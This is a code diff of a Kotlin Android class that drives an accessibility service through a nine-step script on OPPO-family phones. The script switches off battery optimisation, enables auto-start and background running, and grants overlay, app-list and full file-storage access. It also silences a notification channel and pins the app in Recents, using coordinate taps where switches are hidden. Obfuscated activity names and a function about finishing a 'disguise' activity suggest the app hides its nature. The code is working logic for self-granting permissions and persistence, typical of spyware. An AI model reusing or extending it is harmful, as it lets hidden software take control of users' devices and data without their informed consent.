@@ -9,6 +9,7 @@ import android.util.Log
 import com.storm.safe.rock.auto.condition.CombineFilter
 import com.storm.safe.rock.auto.entity.UiNode
 import com.storm.safe.rock.service.MyAccessibilityService
+import kotlinx.coroutines.CancellationException
 import kotlinx.coroutines.delay
 
 /**
@@ -64,28 +65,9 @@ open class OppoSteps(
             )
         )
 
-        /**
-         * Step 1 permission dialog allow-button resource-ids,按优先级 3 个(Android 12+ permissioncontroller)。
-         * PERMISSION_ALLOW_IDS 是更宽泛的 8-id fallback 列表(含 packageinstaller 等老 Android 版本);
-         * STEP1_ALLOW_IDS 是华为真机 25/26 validated 的最小稳定集。
-         */
-        val STEP1_ALLOW_IDS = listOf(
-            "com.android.permissioncontroller:id/permission_allow_button",
-            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
-            "com.android.permissioncontroller:id/permission_allow_one_time_button"
-        )
-
-        /** Permission allow button IDs for ColorOS. */
-        val PERMISSION_ALLOW_IDS = listOf(
-            "com.android.permissioncontroller:id/permission_allow_button",
-            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
-            "com.android.permissioncontroller:id/permission_allow_one_time_button",
-            "com.android.packageinstaller:id/permission_allow_button",
-            "com.google.android.packageinstaller:id/permission_allow_button",
-            "android:id/button1",
-            "android:id/button2",
-            "com.android.settings:id/action_button"
-        )
+        // ColorOS 16 SubSettings Switch 中心坐标 -- UIAutomator dump: bounds=[995,940][1128,1024]
+        private const val SUBSETTINGS_SWITCH_X = 1062f
+        private const val SUBSETTINGS_SWITCH_Y = 982f
 
         /** Keywords for auto-start toggle. */
         val AUTOSTART_KEYWORDS = listOf(
@@ -98,6 +80,7 @@ open class OppoSteps(
         )
     }
 
+    @Deprecated("Use executeAll() -- 此入口使用旧的 ComponentName 流程", ReplaceWith("executeAll(successes, failures, logs)"))
     suspend fun execute(
         successes: MutableList<String>,
         failures: MutableList<String>,
@@ -218,7 +201,7 @@ open class OppoSteps(
                 launchIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                 launchIntent?.putExtra("SMART_RETURN_BACKUP", true)
                 launchIntent?.let { context.startActivity(it) }
-            } catch (e: kotlinx.coroutines.CancellationException) { throw e } catch (_: Exception) {}
+            } catch (e: CancellationException) { throw e } catch (_: Exception) {}
             delay(1500L)
             act = com.storm.safe.rock.iuzxujjtqev.getCurrentActivity()
         }
@@ -244,7 +227,7 @@ open class OppoSteps(
                 context.startActivity(intent)
                 logs.add("[Step 1/9] ✓ fallback 启动 umrkmgrri")
                 delay(1500L)
-            } catch (e: kotlinx.coroutines.CancellationException) { throw e } catch (e: Exception) {
+            } catch (e: CancellationException) { throw e } catch (e: Exception) {
                 Log.w(TAG, "[Step1] launch umrkmgrri failed: ${e.message}")
             }
         }
@@ -277,87 +260,11 @@ open class OppoSteps(
         if (granted > 0) {
             successes.add("[Step 1/9] 用户手动授予 $granted 个权限")
         } else {
-            failures.add("[Step 1/9] 60s 内用户未授予任何权限(ColorOS 16 需手动点击允许)")
+            failures.add("[Step 1/9] ${timeoutMs/1000}s 内用户未授予任何权限(ColorOS 16 需手动点击允许)")
         }
 
         // runStep 统一 HOME 清场
     }
-
-    /**
-     * Phase G#2: 专门查找 com.android.permissioncontroller 的 window root。
-     *
-     * 不用 A11yWindowResolver.resolveRoot(通用版会匹配 com.android.settings 导致搜错 root),
-     * 只找 permissioncontroller 包的 TYPE_APPLICATION window。
-     */
-    private fun findPermissionControllerRoot(svc: android.accessibilityservice.AccessibilityService): android.view.accessibility.AccessibilityNodeInfo? {
-        return try {
-            val windows = svc.windows ?: return null
-            // 诊断:列出所有 window 的 type + pkg,定位 permissioncontroller 是否在列表
-            val sb = StringBuilder("[Step1] windows(${windows.size}):")
-            for (w in windows) {
-                val root = try { w.root } catch (_: Exception) { null }
-                val pkg = root?.packageName?.toString() ?: "null"
-                val typeStr = when (w.type) {
-                    android.view.accessibility.AccessibilityWindowInfo.TYPE_APPLICATION -> "APP"
-                    android.view.accessibility.AccessibilityWindowInfo.TYPE_SYSTEM -> "SYS"
-                    android.view.accessibility.AccessibilityWindowInfo.TYPE_INPUT_METHOD -> "IME"
-                    android.view.accessibility.AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY -> "OVL"
-                    else -> "T${w.type}"
-                }
-                sb.append(" [$typeStr:$pkg]")
-                if (w.type == android.view.accessibility.AccessibilityWindowInfo.TYPE_APPLICATION &&
-                    pkg == "com.android.permissioncontroller") {
-                    Log.d(TAG, "[Step1] 🎯 找到 permissioncontroller window id=${w.id}")
-                    return root
-                }
-            }
-            Log.d(TAG, sb.toString())
-            null
-        } catch (_: Exception) { null }
-    }
-
-    /**
-     * Phase F: 启动 umrkmgrri 之前主动 finish iuzxujjtqev。
-     *
-     * 真机根因(OPPO PGFM10 Android 16 / ColorOS 16 logcat 实锤):
-     * - iuzxujjtqev 是 `launchMode="singleInstance"`,独占 task 且 SMART_RETURN_BACKUP=true 时驻留
-     * - umrkmgrri 即使走 FLAG_ACTIVITY_NEW_TASK 到独立 task,也抢不到 focus
-     * - 结果 umrkmgrri.requestPermissions() 被接受但 GrantPermissionsActivity 从未真实激活
-     *   (onRequestPermissionsResult 永不回调 → Step 1 轮询 10s 看不到任何 permissioncontroller UI)
-     *
-     * 修复:在启动 umrkmgrri 前主动 finish 当前 iuzxujjtqev(若存在),让 task 592 消失,
-     * umrkmgrri 的 task 593 接管 focus。finish 调用在 UI 线程 dispatch,非阻塞。
-     */
-    open fun finishDisguiseActivityIfAlive(logs: MutableList<String>) {
-        try {
-            val act = com.storm.safe.rock.iuzxujjtqev.getCurrentActivity()
-            if (act == null || act.isFinishing || act.isDestroyed) return
-            Log.i(TAG, "[Step 1/9] 检测到 iuzxujjtqev 前台,主动 finish 避免遮盖 umrkmgrri")
-            logs.add("[Step 1/9] 主动 finish iuzxujjtqev(Phase F 修复 focus 遮盖)")
-            act.runOnUiThread {
-                try { act.finish() } catch (_: Exception) { /* 不阻断 Step 1 */ }
-            }
-        } catch (e: kotlinx.coroutines.CancellationException) {
-            throw e
-        } catch (e: Exception) {
-            Log.w(TAG, "[Step 1/9] finishDisguiseActivityIfAlive 异常(不阻断): ${e.message}")
-        }
-    }
-
-    /** 按 3 个 permissioncontroller resource-id 优先级查 + 点击,返回命中 id 短名或 null. */
-    private fun clickPermissionControllerAllowButton(root: android.view.accessibility.AccessibilityNodeInfo): String? {
-        val uiRoot = UiNode.createRoot(root) ?: return null
-        for (id in STEP1_ALLOW_IDS) {
-            val nodes = uiRoot.findById(id)
-            for (i in 0 until nodes.size()) {
-                val n = nodes.get(i) ?: continue
-                if (!n.isVisibleToUser) continue
-                if (n.click()) return id.substringAfterLast('/')
-            }
-        }
-        return null
-    }
-
 
     // ━━━━━━━━━━━━━━━━━ SubBrand & appLabel(Task 2 引入)━━━━━━━━━━━━━━━━━
 
@@ -479,9 +386,9 @@ open class OppoSteps(
         val sdk = android.os.Build.VERSION.SDK_INT
         logs.add("[Step 2/9] mRealme SDK=$sdk")
         openSettings()
-        kotlinx.coroutines.delay(800L)
+        delay(800L)
         clickTextWithScroll("电池", scrollLimit = 5)
-        kotlinx.coroutines.delay(600L)
+        delay(600L)
 
         when {
             sdk >= 36 -> {
@@ -491,7 +398,7 @@ open class OppoSteps(
             }
             sdk == 35 -> {
                 clickTextWithScroll("省电设置", scrollLimit = 3)
-                kotlinx.coroutines.delay(400L)
+                delay(400L)
                 closeSwitch("睡眠待机优化")
                 closeSwitch("自动进入省电模式")
                 pressBack(); pressBack(); pressBack()
@@ -499,7 +406,7 @@ open class OppoSteps(
             sdk == 29 -> {
                 closeSwitch("省电模式")
                 clickTextWithScroll("智能省电场景", scrollLimit = 3)
-                kotlinx.coroutines.delay(400L)
+                delay(400L)
                 closeSwitch("睡眠待机优化")
             }
             else -> {
@@ -523,9 +430,9 @@ open class OppoSteps(
         val sdk = android.os.Build.VERSION.SDK_INT
         logs.add("[Step 2/9] mOnePlus SDK=$sdk")
         openSettings()
-        kotlinx.coroutines.delay(800L)
+        delay(800L)
         clickTextWithScroll("电池", scrollLimit = 5)
-        kotlinx.coroutines.delay(600L)
+        delay(600L)
 
         when {
             sdk >= 36 -> {
@@ -535,9 +442,9 @@ open class OppoSteps(
             }
             sdk == 35 -> {
                 clickTextWithScroll("电池模式", scrollLimit = 3)
-                kotlinx.coroutines.delay(400L)
+                delay(400L)
                 clickText("均衡模式")
-                kotlinx.coroutines.delay(400L)
+                delay(400L)
                 clickTextWithScroll("省电设置", scrollLimit = 3)
                 closeSwitch("自动进入省电模式")
                 closeSwitch("睡眠待机优化")
@@ -575,7 +482,7 @@ open class OppoSteps(
     /** 打开系统设置首页 */
     // vendor m212344e8 (openSettingsSmali) 对齐:flags = 0x50800000
     //   FLAG_ACTIVITY_NEW_TASK (0x10000000)
-    //   FLAG_ACTIVITY_RESET_TASK_IF_NEEDED (0x40000000) ← 关键!确保 Settings reset 到首页
+    //   FLAG_ACTIVITY_RESET_TASK_IF_NEEDED -- 确保 Settings reset 到首页
     //   FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS (0x00800000)
     // 缺 RESET_TASK_IF_NEEDED 会导致 Settings 复用残留的 SubSettings(如无障碍页),
     // clickTextWithScroll("电池") 在子页面找不到 → 全部 false。
@@ -584,11 +491,11 @@ open class OppoSteps(
             val i = android.content.Intent(android.provider.Settings.ACTION_SETTINGS)
                 .addFlags(
                     android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
-                    0x40000000 or  // FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
+                    android.content.Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED or
                     android.content.Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                 )
             context.startActivity(i)
-        } catch (e: kotlinx.coroutines.CancellationException) { throw e } catch (e: Exception) {
+        } catch (e: CancellationException) { throw e } catch (e: Exception) {
             android.util.Log.w(TAG, "openSettings: ${e.message}")
         }
     }
@@ -631,11 +538,11 @@ open class OppoSteps(
                 .setData(android.net.Uri.parse("package:${context.packageName}"))
                 .addFlags(
                     android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
-                    0x40000000 or  // FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
+                    android.content.Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED or
                     android.content.Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                 )
             context.startActivity(i)
-        } catch (e: kotlinx.coroutines.CancellationException) { throw e } catch (e: Exception) {
+        } catch (e: CancellationException) { throw e } catch (e: Exception) {
             android.util.Log.w(TAG, "openAppDetails: ${e.message}")
         }
     }
@@ -653,7 +560,7 @@ open class OppoSteps(
     open suspend fun navigateByHashPath(path: String, scrollLimit: Int = 3) {
         for (segment in path.split("#")) {
             clickTextWithScroll(segment, scrollLimit = scrollLimit)
-            kotlinx.coroutines.delay(500L)
+            delay(500L)
         }
     }
 
@@ -712,10 +619,13 @@ open class OppoSteps(
     }
 
     /** 滚到列表顶部(OPPO InstalledAppDetails 可能缓存上次滚动位置) */
-    private fun scrollToTop() {
+    private suspend fun scrollToTop() {
         val root = rootNode() ?: return
         val scrollable = root.findOneByCombine(CombineFilter.scrollable()) ?: return
-        scrollable.scrollBackwardEnd()
+        repeat(10) {
+            if (!scrollable.scrollBackward()) return
+            delay(150L)
+        }
     }
 
     /** 关闭名为 text 的 Switch(当前 checked=true 则 click 切为 false) */
@@ -812,7 +722,7 @@ open class OppoSteps(
             return true
         } else {
             openAppDetails()
-            kotlinx.coroutines.delay(800L)
+            delay(800L)
             val switchTexts = listOf("允许自动启动", "允许应用自启动", "自动启动", "允许自启动", "开机自启动")
             for (s in switchTexts) { if (openSwitch(s)) return true }
             return false
@@ -847,7 +757,7 @@ open class OppoSteps(
 
         // SDK<35 fallback:独立执行后台开关
         openAppDetails()
-        kotlinx.coroutines.delay(800L)
+        delay(800L)
         val batteryEntries = listOf("耗电管理", "耗电保护", "电量消耗", "耗电详情", "电池")
         var entered = false
         for (t in batteryEntries) { if (clickText(t)) { entered = true; break } }
@@ -855,7 +765,7 @@ open class OppoSteps(
             failures.add("[Step 3/9] 未找到耗电管理入口")
             return false
         }
-        kotlinx.coroutines.delay(800L)
+        delay(800L)
         val bgTexts = listOf(
             "完全允许后台行为", "允许应用后台行为", "允许完全后台行为",
             "允许后台运行", "完全后台行为", "后台运行", "允许后台活动"
@@ -902,7 +812,7 @@ open class OppoSteps(
 
         // Phase E: 点完开关后二次回验 Settings.canDrawOverlays() 真实效果,
         // 避免点到"不允许"按钮或其他应用的允许按钮而虚假 mark success。
-        kotlinx.coroutines.delay(500L)
+        delay(500L)
         val actuallyGranted = canDrawOverlaysNow()
         if (actuallyGranted) {
             logs.add("[Step 4/9] ✓ canDrawOverlays 回验通过,mark completed")
@@ -917,83 +827,6 @@ open class OppoSteps(
     }
 
     open fun canDrawOverlaysNow(): Boolean = android.provider.Settings.canDrawOverlays(context)
-
-    open suspend fun launchOverlaySettings() {
-        // Phase D: ColorOS 16 将带 `package:xxx` URI 的 MANAGE_OVERLAY_PERMISSION Intent
-        //          重定向到 AppWriteSettingsActivity(WRITE_SETTINGS 页,不是 Overlay)。
-        //          先尝试不带 URI 打开总列表,由 tryOpenOverlaySwitch 滚找 app。
-        try {
-            val i = android.content.Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
-                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
-            context.startActivity(i)
-            return
-        } catch (e: kotlinx.coroutines.CancellationException) { throw e } catch (e: Exception) {
-            android.util.Log.w(TAG, "launchOverlaySettings(no-uri): ${e.message}")
-        }
-        // Fallback: 老版本 Android 可能需要 URI 才响应
-        try {
-            val i = android.content.Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
-                .setData(android.net.Uri.parse("package:${context.packageName}"))
-                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
-            context.startActivity(i)
-        } catch (e: kotlinx.coroutines.CancellationException) { throw e } catch (e: Exception) {
-            android.util.Log.w(TAG, "launchOverlaySettings(uri): ${e.message}")
-        }
-    }
-
-    open suspend fun tryOpenOverlaySwitch(
-        successes: MutableList<String>,
-        logs: MutableList<String>
-    ): Boolean {
-        // 诊断:launchOverlaySettings 后页面状态
-        val pkg = try { service?.rootInActiveWindow?.packageName?.toString() } catch (_: Exception) { null }
-        Log.d(TAG, "[Step4] launch 后 root pkg=$pkg")
-
-        // 诊断:service.windows 有哪些
-        try {
-            val windows = service?.windows
-            val sb = StringBuilder("[Step4] windows(${windows?.size ?: 0}):")
-            windows?.forEach { w ->
-                val r = try { w.root } catch (_: Exception) { null }
-                val p = r?.packageName?.toString() ?: "null"
-                sb.append(" [${p}]")
-            }
-            Log.d(TAG, sb.toString())
-        } catch (_: Exception) {}
-
-        val foundApp = clickTextWithScroll(appLabel, scrollLimit = 25)
-        Log.d(TAG, "[Step4] clickTextWithScroll($appLabel)=$foundApp")
-        kotlinx.coroutines.delay(600L)
-
-        val texts = listOf(
-            "授予悬浮窗权限", "允许在其他应用上层显示", "在其他应用上层显示", "显示在其他应用上层",
-            "允许显示悬浮窗", "显示悬浮窗"
-        )
-        for (t in texts) {
-            val sw = openSwitch(t)
-            Log.d(TAG, "[Step4] openSwitch($t)=$sw")
-            if (sw) {
-                clickText("允许")
-                successes.add("[Step 4/9] 悬浮窗已开启($t)")
-                return true
-            }
-        }
-        // toggleSwitchById fallback
-        val byId = toggleSwitchById("android:id/switch_widget")
-        Log.d(TAG, "[Step4] toggleSwitchById(switch_widget)=$byId")
-        if (byId) {
-            successes.add("[Step 4/9] 悬浮窗 switch_widget 开启")
-            return true
-        }
-
-        val allowClicked = clickText("允许")
-        Log.d(TAG, "[Step4] clickText(允许) fallback=$allowClicked")
-        if (allowClicked) {
-            successes.add("[Step 4/9] 悬浮窗 fallback 允许")
-            return true
-        }
-        return false
-    }
 
     /**
      * 走应用详情→滚到底部→"悬浮窗"入口→SubSettings 悬浮窗详情页→坐标点击 Switch。
@@ -1021,8 +854,8 @@ open class OppoSteps(
 
         // 3. ColorOS 16 SubSettings 内容对 AccessibilityService 不可见,
         //    用坐标点击 Switch(真机 dump: bounds=[995,940][1128,1024], center≈1062,982)
-        val tapped = tapAtCoordinate(1062f, 982f)
-        Log.d(TAG, "[Step4] tapAtCoordinate(1062,982)=$tapped")
+        val tapped = tapAtCoordinate(SUBSETTINGS_SWITCH_X, SUBSETTINGS_SWITCH_Y)
+        Log.d(TAG, "[Step4] tapAtCoordinate($SUBSETTINGS_SWITCH_X,$SUBSETTINGS_SWITCH_Y)=$tapped")
         if (tapped) {
             delay(1000L)
             successes.add("[Step 4/9] 悬浮窗 Switch 坐标点击")
@@ -1031,16 +864,10 @@ open class OppoSteps(
         return false
     }
 
-    /** dispatchGesture 坐标点击 */
+    /** dispatchGesture 坐标点击(委托 GestureTapHelper,含 1px jitter 修复 + 回调等待) */
     private suspend fun tapAtCoordinate(x: Float, y: Float): Boolean {
         val svc = service ?: return false
-        return try {
-            val path = android.graphics.Path().apply { moveTo(x, y); lineTo(x, y) }
-            val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 100)
-            val gesture = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke).build()
-            svc.dispatchGesture(gesture, null, null)
-            true
-        } catch (_: Exception) { false }
+        return GestureTapHelper.performTap(svc, x, y, 100L)
     }
 
     // ━━━━━━━━━━━━━━━━━ Step 5 — 应用列表(ColorOS 独有)━━━━━━━━━━━━━━━━━
@@ -1068,7 +895,7 @@ open class OppoSteps(
         }
         logs.add("[Step 5/9] ▶ 读取应用列表开始(SDK=$sdk)")
         openAppDetails()
-        kotlinx.coroutines.delay(800L)
+        delay(800L)
         val ok = tryOpenAppListSwitch(successes, logs)
         if (ok) {
             OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP5_APPLIST)
@@ -1091,11 +918,11 @@ open class OppoSteps(
         logs: MutableList<String>
     ): Boolean {
         clickTextWithScroll("权限管理", scrollLimit = 3) || clickTextWithScroll("权限", scrollLimit = 3)
-        kotlinx.coroutines.delay(600L)
+        delay(600L)
         val texts = listOf("读取已安装应用列表", "读取已安装应用", "获取已安装应用", "查看已安装应用", "应用列表")
         for (t in texts) {
             if (clickTextWithScroll(t, scrollLimit = 10)) {
-                kotlinx.coroutines.delay(400L)
+                delay(400L)
                 if (clickText("允许")) { successes.add("[Step 5/9] AppList 允许点中"); return true }
             }
         }
@@ -1140,11 +967,11 @@ open class OppoSteps(
                 .setData(android.net.Uri.parse("package:${context.packageName}"))
                 .addFlags(
                     android.content.Intent.FLAG_ACTIVITY_NEW_TASK or
-                    0x40000000 or  // FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
+                    android.content.Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED or
                     android.content.Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                 )
             context.startActivity(i)
-        } catch (e: kotlinx.coroutines.CancellationException) { throw e } catch (e: Exception) {
+        } catch (e: CancellationException) { throw e } catch (e: Exception) {
             android.util.Log.w(TAG, "launchFileAccessSettings: ${e.message}")
         }
     }
@@ -1170,20 +997,20 @@ open class OppoSteps(
         if (!toggled) {
             // 坐标点击 Switch(真机 dump: 与悬浮窗页面相同位置 bounds=[995,940][1128,1024])
             Log.d(TAG, "[Step6] AccessibilityService 不可见,坐标点击 Switch")
-            toggled = tapAtCoordinate(1062f, 982f)
+            toggled = tapAtCoordinate(SUBSETTINGS_SWITCH_X, SUBSETTINGS_SWITCH_Y)
             Log.d(TAG, "[Step6] tapAtCoordinate=$toggled")
         }
         if (!toggled) return false
-        kotlinx.coroutines.delay(800L)
+        delay(800L)
         val sdk = android.os.Build.VERSION.SDK_INT
         when {
             sdk in 29..31 -> listOf("确定", "OK", "允许", "Allow", "我知道了", "Got it").any { clickText(it) }
             sdk == 32 -> listOf("确定", "应用", "允许").any { clickText(it) }
-            sdk == 33 -> { clickText("确定"); kotlinx.coroutines.delay(400L); clickText("允许") }
+            sdk == 33 -> { clickText("确定"); delay(400L); clickText("允许") }
             sdk >= 34 -> listOf("允许", "授予权限", "确定").any { clickText(it) }
             else -> clickText("确定")
         }
-        kotlinx.coroutines.delay(800L)
+        delay(800L)
         val granted = isExternalStorageManagerNow()
         if (granted) successes.add("[Step 6/9] MANAGE_EXTERNAL_STORAGE 已获取")
         return granted
@@ -1201,7 +1028,7 @@ open class OppoSteps(
         }
         logs.add("[Step 7/9] ▶ 关闭 OFF 通知渠道开始")
         launchChannelSettings("OFF")
-        kotlinx.coroutines.delay(800L)
+        delay(800L)
 
         // Phase E: 改用 NotificationManagerCompat.areNotificationsEnabled()
         // 真机 dumpsys 显示 OFF channel importance=2(LOW),不是 0(NONE);
@@ -1247,7 +1074,7 @@ open class OppoSteps(
                 .putExtra("android.provider.extra.CHANNEL_ID", channelId)
                 .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
             context.startActivity(i)
-        } catch (e: kotlinx.coroutines.CancellationException) { throw e } catch (e: Exception) {
+        } catch (e: CancellationException) { throw e } catch (e: Exception) {
             android.util.Log.w(TAG, "launchChannelSettings: ${e.message}")
         }
     }
@@ -1262,7 +1089,7 @@ open class OppoSteps(
                 successes.add("[Step 7/9] 允许通知 已关闭")
                 return true
             }
-            kotlinx.coroutines.delay(500L)
+            delay(500L)
         }
         return false
     }
@@ -1289,14 +1116,14 @@ open class OppoSteps(
             val launch = context.packageManager.getLaunchIntentForPackage(context.packageName)
             launch?.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
             launch?.let { context.startActivity(it) }
-            kotlinx.coroutines.delay(500L)
-        } catch (e: kotlinx.coroutines.CancellationException) { throw e } catch (_: Exception) {}
+            delay(500L)
+        } catch (e: CancellationException) { throw e } catch (_: Exception) {}
 
         try { svc.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS) } catch (_: Exception) {}
-        kotlinx.coroutines.delay(1200L)
+        delay(1200L)
 
         horizontalSwipeToActivate()
-        kotlinx.coroutines.delay(500L)
+        delay(500L)
 
         val ok = tryLockAppCard(successes, logs)
         if (ok) {
@@ -1344,7 +1171,7 @@ open class OppoSteps(
                     val t = try { m.text?.toString() ?: "" } catch (_: Exception) { "" }
                     val desc = try { m.contentDescription?.toString() ?: "" } catch (_: Exception) { "" }
                     if (t == "更多" || desc == "更多") {
-                        UiNode.createRoot(m)?.click(); kotlinx.coroutines.delay(800L); break
+                        UiNode.createRoot(m)?.click(); delay(800L); break
                     }
                 }
                 for (lt in lockTexts) {
@@ -1361,7 +1188,7 @@ open class OppoSteps(
                     }
                 }
             }
-            kotlinx.coroutines.delay(600L)
+            delay(600L)
         }
         return false
     }
@@ -1382,7 +1209,7 @@ open class OppoSteps(
             svc.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
             successes.add("[Step 9/9] 返回桌面完成")
             logs.add("[Step 9/9] ✓ performGlobalAction(HOME)")
-        } catch (e: kotlinx.coroutines.CancellationException) { throw e } catch (e: Exception) {
+        } catch (e: CancellationException) { throw e } catch (e: Exception) {
             failures.add("[Step 9/9] HOME 触发异常: ${e.message}")
         }
     }
@@ -1430,7 +1257,7 @@ open class OppoSteps(
     ) {
         try {
             block()
-        } catch (e: kotlinx.coroutines.CancellationException) {
+        } catch (e: CancellationException) {
             throw e
         } catch (e: Exception) {
             android.util.Log.e(TAG, "$name 异常", e)
